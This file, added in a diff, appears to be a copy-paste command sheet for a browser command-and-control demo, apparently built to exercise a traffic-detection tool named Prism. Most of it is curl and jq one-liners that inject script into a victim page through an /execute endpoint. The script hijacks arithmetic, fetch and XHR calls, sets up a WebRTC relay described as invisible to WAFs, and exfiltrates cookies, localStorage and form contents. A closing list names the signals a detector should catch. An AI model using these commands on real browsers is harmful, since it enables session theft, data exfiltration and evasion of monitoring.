@@ -1,0 +1,109 @@
+# C2 One-Liners (jq + curl)
+# Copy-paste ready commands for demo
+
+# ============================================================
+# SETUP
+# ============================================================
+
+# Start server
+node server_for_c2.js
+
+# Open browser to:
+# http://localhost:3000/working_c2_browser_pixel.html
+
+# ============================================================
+# DEMO FLOW
+# ============================================================
+
+# 1. BASELINE: Click button → shows "5 + 5 = 10"
+
+# 2. INJECT TAMPER SCRIPT (from file):
+jq -n --rawfile code tamper-functions.js '{code: $code}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# 3. ACTIVATE HIJACK:
+echo 'TamperKit.hijackAdd(100);' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# 4. Click button → shows "5 + 5 = 110" 🎯
+
+# ============================================================
+# INDIVIDUAL COMMANDS
+# ============================================================
+
+# Hijack add with custom markup ($500)
+echo 'TamperKit.hijackAdd(500);' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Hijack fetch (intercept all HTTP)
+echo 'TamperKit.hijackFetch();' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Hijack XHR
+echo 'TamperKit.hijackXHR();' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Full tamper suite (all hijacks)
+echo 'TamperKit.runAll();' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Restore everything
+echo 'TamperKit.restore();' | jq -Rs '{code: .}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# ============================================================
+# WEBRTC P2P (bypasses network monitoring)
+# ============================================================
+
+# Browser 1 → become relay
+echo '{"action":"become_relay"}' | \
+  curl -X POST http://localhost:3000/c2_command \
+    -H "Content-Type: application/json" -d @-
+
+# Browser 2 → become victim
+echo '{"action":"become_victim"}' | \
+  curl -X POST http://localhost:3000/c2_command \
+    -H "Content-Type: application/json" -d @-
+
+# Send code via relay → victim (P2P, invisible to WAF)
+echo 'alert("via WebRTC P2P")' | jq -Rs '{action:"send_to_victim", code:.}' | \
+  curl -X POST http://localhost:3000/c2_command \
+    -H "Content-Type: application/json" -d @-
+
+# ============================================================
+# EXFILTRATION
+# ============================================================
+
+# Exfil cookies
+echo 'TamperKit.exfil({type:"cookies", data:document.cookie});' | jq -Rs '{code:.}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Exfil localStorage
+echo 'TamperKit.exfil({type:"localStorage", data:JSON.stringify(localStorage)});' | jq -Rs '{code:.}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# Exfil form data
+echo 'TamperKit.exfil({type:"forms", data:Array.from(document.forms).map(f=>f.outerHTML)});' | jq -Rs '{code:.}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
+
+# ============================================================
+# TRAFFIC PRISM DETECTION POINTS
+# ============================================================
+
+# What Prism should catch:
+# 1. POST /execute with JS payload (code injection)
+# 2. Function redefinition (window.add overwritten)
+# 3. sendBeacon to /exfil (data exfiltration)
+# 4. WebRTC DataChannel creation without user gesture
+# 5. Socket.IO events: 'execute', 'c2_command' patterns
+# 6. Behavioral: math result changed without page reload
